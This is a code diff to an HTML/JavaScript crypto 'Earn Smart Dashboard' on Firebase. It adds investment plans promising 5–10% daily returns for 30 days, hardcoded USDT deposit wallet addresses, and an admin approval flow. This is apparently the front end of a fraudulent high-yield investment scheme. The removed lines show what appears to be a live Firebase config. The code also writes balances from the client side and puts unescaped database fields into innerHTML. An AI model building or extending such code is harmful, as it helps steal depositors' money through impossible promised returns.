@@ -34,14 +34,6 @@ body{
   box-shadow:0 0 20px rgba(192,192,192,0.2);
 }
 
-.profile{
-  background:#111827;
-  padding:10px;
-  border-radius:10px;
-  margin-bottom:20px;
-  font-size:14px;
-}
-
 button{
   padding:10px;
   border:none;
@@ -50,6 +42,7 @@ button{
   font-weight:bold;
 }
 
+.activate-btn{background:#22c55e;color:white;}
 .approve-btn{background:#22c55e;color:white;}
 .reject-btn{background:#ef4444;color:white;}
 
@@ -69,7 +62,6 @@ input,select{
 }
 
 .hidden{display:none;}
-.price{font-size:14px;margin:5px 0;}
 </style>
 </head>
 <body>
@@ -89,23 +81,20 @@ document.body.appendChild(span);
 
 <h2>Earn Smart Dashboard</h2>
 
-<div class="profile">
-Profile ID: <span id="profileEmail">Loading...</span>
-</div>
-
-<!-- LIVE CRYPTO PRICES -->
-<div class="card">
-<h3>Live Crypto Prices</h3>
-<div id="prices"></div>
-</div>
-
 <div class="card">
 <h3>Balance: $<span id="balance">0</span></h3>
 </div>
 
-<!-- DEPOSIT -->
+<!-- STEP 1 SELECT PLAN -->
 <div class="card">
-<h3>Activate Investment</h3>
+<h3>Select Investment Plan</h3>
+
+<select id="planSelect">
+<option value="">Select Plan</option>
+<option value="starter">Starter - $5 (5% daily 30 days)</option>
+<option value="silver">Silver - $10 (5% daily 30 days)</option>
+<option value="diamond">Diamond - $20 (10% daily 30 days)</option>
+</select>
 
 <select id="networkSelect">
 <option value="">Select Network</option>
@@ -114,15 +103,23 @@ Profile ID: <span id="profileEmail">Loading...</span>
 <option value="erc20">USDT ERC20</option>
 </select>
 
-<button onclick="showWallet()">Generate Deposit Address</button>
+<button onclick="generateDeposit()">Generate Deposit Address</button>
 
 <div id="walletSection" class="hidden">
 <div class="wallet-box" id="walletAddress"></div>
 <button onclick="copyWallet()">Copy Wallet</button>
 
-<input type="number" id="depositAmount" placeholder="Amount Sent">
+<p id="requiredAmount"></p>
+
+<input type="number" id="depositAmount" placeholder="Enter Amount Sent">
 <button onclick="submitDeposit()">Submit Deposit</button>
 </div>
+</div>
+
+<!-- STEP 2 ACTIVATE PLAN -->
+<div class="card">
+<h3>Activate Plan After Approval</h3>
+<button class="activate-btn" onclick="activatePlan()">Activate Investment</button>
 </div>
 
 <!-- ADMIN PANEL -->
@@ -139,29 +136,21 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebas
 import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
 import { getDatabase, ref, push, onValue, update, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
-const firebaseConfig = {
-  apiKey: "AIzaSyAZP0UPvfCgiiir2zKLMae25dUpVcyP3iw",
-  authDomain: "crypto-gainz-3524d.firebaseapp.com",
-  databaseURL: "https://crypto-gainz-3524d-default-rtdb.firebaseio.com",
-  projectId: "crypto-gainz-3524d",
-  storageBucket: "crypto-gainz-3524d.firebasestorage.app",
-  messagingSenderId: "270349829717",
-  appId: "1:270349829717:web:6e3e2bf25f9ab60b2a76dc"
-};
+const firebaseConfig = { /* YOUR CONFIG HERE */ };
 
-const ADMIN_EMAIL="admin@email.com"; // CHANGE THIS
+const ADMIN_EMAIL="earnsmartapps@gmail.com"; // change this
 
 const app=initializeApp(firebaseConfig);
 const auth=getAuth(app);
 const db=getDatabase(app);
 
 let selectedWallet="";
+let selectedPlan="";
+let selectedAmount=0;
 
 /* AUTH */
 onAuthStateChanged(auth,(user)=>{
 if(!user){window.location="index.html";return;}
-
-document.getElementById("profileEmail").innerText=user.email;
 
 onValue(ref(db,'users/'+user.uid),(snap)=>{
 document.getElementById("balance").innerText=
@@ -174,40 +163,73 @@ loadDeposits();
 }
 });
 
-/* WALLET */
-window.showWallet=()=>{
-const net=document.getElementById("networkSelect").value;
-if(!net) return alert("Select network");
+/* GENERATE DEPOSIT */
+window.generateDeposit=()=>{
+selectedPlan=document.getElementById("planSelect").value;
+const network=document.getElementById("networkSelect").value;
 
-if(net==="trc20") selectedWallet="TKJAvkyjdDSzKtS1HihiKno1tTfi2bTJJe";
-if(net==="bsc") selectedWallet="0xB66E1e0e5452489298bebd7Cd463587E6866baD2";
-if(net==="erc20") selectedWallet="0xB66E1e0e5452489298bebd7Cd463587E6866baD2";
+if(!selectedPlan||!network) return alert("Select plan & network");
+
+if(selectedPlan==="starter") selectedAmount=5;
+if(selectedPlan==="silver") selectedAmount=10;
+if(selectedPlan==="diamond") selectedAmount=20;
+
+if(network==="trc20") selectedWallet="TKJAvkyjdDSzKtS1HihiKno1tTfi2bTJJe";
+if(network==="bsc") selectedWallet="0xB66E1e0e5452489298bebd7Cd463587E6866baD2";
+if(network==="erc20") selectedWallet="0xB66E1e0e5452489298bebd7Cd463587E6866baD2";
 
 document.getElementById("walletAddress").innerText=selectedWallet;
+document.getElementById("requiredAmount").innerText="Send exactly $" + selectedAmount;
 document.getElementById("walletSection").classList.remove("hidden");
 };
 
 window.copyWallet=()=>{
 navigator.clipboard.writeText(selectedWallet);
-alert("Copied!");
+alert("Wallet Copied!");
 };
 
 /* SUBMIT DEPOSIT */
 window.submitDeposit=async()=>{
 const user=auth.currentUser;
 const amount=parseFloat(document.getElementById("depositAmount").value);
-if(!amount) return alert("Enter amount");
+
+if(amount!==selectedAmount)
+return alert("Amount must match selected plan");
 
 await push(ref(db,'deposits'),{
 uid:user.uid,
+plan:selectedPlan,
 amount,
 status:"pending",
 date:Date.now()
 });
-alert("Deposit Submitted");
+
+alert("Deposit submitted. Wait for admin approval.");
 };
 
-/* ADMIN LOAD DEPOSITS */
+/* ACTIVATE PLAN */
+window.activatePlan=async()=>{
+const user=auth.currentUser;
+const userRef=ref(db,'users/'+user.uid);
+const snap=await get(userRef);
+let balance=snap.val()?.balance||0;
+
+if(balance<selectedAmount)
+return alert("Deposit not approved yet");
+
+await update(userRef,{balance:balance-selectedAmount});
+
+await push(ref(db,'investments/'+user.uid),{
+plan:selectedPlan,
+amount:selectedAmount,
+startDate:Date.now(),
+paid:false
+});
+
+alert("Investment Activated!");
+};
+
+/* ADMIN PANEL */
 function loadDeposits(){
 onValue(ref(db,'deposits'),(snap)=>{
 const data=snap.val();
@@ -216,12 +238,13 @@ for(const id in data){
 const d=data[id];
 if(d.status==="pending"){
 html+=`
-<div style="margin-bottom:10px;">
+<div>
 User: ${d.uid}<br>
+Plan: ${d.plan}<br>
 Amount: $${d.amount}<br>
 <button class="approve-btn" onclick="approveDeposit('${id}','${d.uid}',${d.amount})">Approve</button>
 <button class="reject-btn" onclick="rejectDeposit('${id}')">Reject</button>
-</div>`;
+</div><hr>`;
 }
 }
 document.getElementById("depositRequests").innerHTML=html||"No pending deposits";
@@ -235,7 +258,7 @@ let bal=snap.val()?.balance||0;
 
 await update(userRef,{balance:bal+amount});
 await update(ref(db,'deposits/'+id),{status:"approved"});
-alert("Approved & Balance Updated");
+alert("Deposit Approved");
 };
 
 window.rejectDeposit=async(id)=>{
@@ -243,26 +266,6 @@ await update(ref(db,'deposits/'+id),{status:"rejected"});
 alert("Rejected");
 };
 
-/* LIVE CRYPTO PRICES */
-async function loadPrices(){
-try{
-const res=await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,binancecoin,tether&vs_currencies=usd");
-const data=await res.json();
-document.getElementById("prices").innerHTML=`
-<div class="price">BTC: $${data.bitcoin.usd}</div>
-<div class="price">ETH: $${data.ethereum.usd}</div>
-<div class="price">BNB: $${data.binancecoin.usd}</div>
-<div class="price">USDT: $${data.tether.usd}</div>
-`;
-}catch(e){
-document.getElementById("prices").innerText="Price loading failed";
-}
-}
-
-loadPrices();
-setInterval(loadPrices,30000);
-
 </script>
-
 </body>
-  </html>
+                            </html>
